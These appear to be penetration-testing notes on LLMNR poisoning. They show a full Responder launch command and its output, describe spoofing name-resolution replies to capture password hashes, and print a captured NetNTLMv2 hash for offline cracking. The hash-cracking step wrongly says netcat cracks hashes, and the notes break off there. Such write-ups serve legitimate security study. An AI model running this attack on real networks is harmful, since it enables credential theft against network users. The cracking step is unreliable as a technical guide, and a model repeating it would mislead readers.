![](assets/Pasted%20image%2020241216164444.png)

# [What's LLMNR?]()

**LLMNR** stands for **Link-Local Multicast Name Resolution**. This is used if the DNS is not in use.  It is a protocol used on local networks to resolve the names of computers (hostnames) to their respective IP addresses without requiring a DNS server. LLMNR operates on the local link (Layer 2) and uses multicast communication to perform name resolution. It is primarily used in small networks or environments where a DNS server is unavailable. However LLMNR can pose security risks: It is vulnerable to **man-in-the-middle (MITM)** attacks and spoofing.

# [LLMNR Poisoning]()

In this attacker tricks a computer on a local network into sending sensitive information, like **usernames** and **password hashes**, to the attacker's system instead of the intended destination.

## [How does it work?]()

- Attacker starts responder with below command. Responder listens on client requests and respond saying it has the resource client is asking. 

```
┌─[✗]─[hexadivine@parrot]─[~]
└──╼ $ sudo responder -I wlp0s20f3 -Pwd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlp0s20f3]
    Responder IP               [192.168.0.105]
    Responder IPv6             [fe80::7635:bf9e:3643:497f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-QMUVSR50L9S]
    Responder Domain Name      [UJW2.LOCAL]
    Responder DCE-RPC Port     [46659]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.0.1, now waiting for incoming requests...
```

- **LLMNR request**: When a computer on the network cannot resolve a hostname (e.g., "FileServer") via DNS, it broadcasts an LLMNR request, asking: _"Does anyone here know the IP for 'FileServer'?"_

![](assets/Pasted%20image%2020241216165512.png)

-  **Attacker responds**: An attacker intercepts this request and replies falsely: _"Yes, I am 'FileServer'—here’s my IP address!"_

![](assets/Pasted%20image%2020241216165958.png)

-  **Victim connects**: The victim connects to the attacker's machine, thinking it's the legitimate server.

![](assets/Pasted%20image%2020241216170210.png)

-  **Password hash theft**: During this connection attempt, the victim's computer automatically sends its credentials (in hashed form) to authenticate. The attacker can capture these password hashes and attempt to crack them offline.

![](assets/Pasted%20image%2020241216170234.png)

- **Hash cracking**: `netcat` is used to crack this hash.
	- Store below hash in a file `/tmp/hash.txt`
	```
	Spiderman::SPIDERMAN:e543dc06b9c71270:E030F466B832DCAD158F57D76D63F0C0:010100000000000000C5922BDC4FDB011C74A358A0F56E4F000000000200080055004A005700320001001E00570049004E002D0051004D005500560053005200350030004C003900530004003400570049004E002D0051004D005500560053005200350030004C00390053002E0055004A00570032002E004C004F00430041004C000300140055004A00570032002E004C004F00430041004C000500140055004A00570032002E004C004F00430041004C000700080000C5922BDC4FDB0106000400020000000800300030000000000000000100000000200000B0E07A7178EDBF77E9F9390D34C3318E86BC82E2B2566F30B833781A1924405B0A0010000000000000000000000000000000000009001E0063006900660073002F00660069006C0065007300650072007600650072000000000000000000
	```
	- Search for hash mode in netcat
	- 